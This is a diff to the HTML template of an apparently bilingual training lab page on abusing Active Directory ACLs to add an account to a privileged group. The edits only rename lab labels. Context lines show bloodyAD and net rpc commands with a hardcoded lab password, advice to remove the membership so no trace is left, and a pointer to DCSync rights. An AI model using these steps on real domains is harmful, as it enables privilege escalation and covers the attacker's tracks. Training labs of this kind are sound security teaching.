@@ -1,5 +1,5 @@
 {% extends "base.html" %}
-{% block title %}AD 09 – ACL Abuse: AddSelf a grupo – HackLabs{% endblock %}
+{% block title %}AD09 – ACL Abuse: AddSelf a grupo – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
@@ -39,7 +39,7 @@ net rpc group addmem 'IT Support' 'svc.readonly' \
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirmar la pertenencia</h3>
-    <p><code>nxc ldap</code> no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa <code>bloodyAD</code>:</p>
+    <p><code>nxc ldap</code> no funciona contra este DC (falla el bind NTLM, ver AD02) — usa <code>bloodyAD</code>:</p>
     <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object 'IT Support' --attr member
 
@@ -59,7 +59,7 @@ cat flag-ad-09.txt</pre>
     <p>Quítate del grupo cuando termines para no dejar rastro persistente:</p>
     <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   remove groupMember 'IT Support' svc.readonly</pre>
-    <p>Ojo: este mismo grupo <code>IT Support</code> tiene derechos de replicación (DCSync) delegados — es el enlace directo con el lab AD 10.</p>
+    <p>Ojo: este mismo grupo <code>IT Support</code> tiene derechos de replicación (DCSync) delegados — es el enlace directo con el lab AD10.</p>
 
     <h3>Mitigación</h3>
     <ul>
@@ -89,7 +89,7 @@ net rpc group addmem 'IT Support' 'svc.readonly' \
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirm the membership</h3>
-    <p><code>nxc ldap</code> does not work against this DC (the NTLM bind fails, see AD 02) — use <code>bloodyAD</code>:</p>
+    <p><code>nxc ldap</code> does not work against this DC (the NTLM bind fails, see AD02) — use <code>bloodyAD</code>:</p>
     <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object 'IT Support' --attr member
 
@@ -109,7 +109,7 @@ cat flag-ad-09.txt</pre>
     <p>Remove yourself from the group when done so you leave no persistent trace:</p>
     <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   remove groupMember 'IT Support' svc.readonly</pre>
-    <p>Note: this very <code>IT Support</code> group has replication (DCSync) rights delegated — it is the direct bridge into lab AD 10.</p>
+    <p>Note: this very <code>IT Support</code> group has replication (DCSync) rights delegated — it is the direct bridge into lab AD10.</p>
 
     <h3>Mitigation</h3>
     <ul>
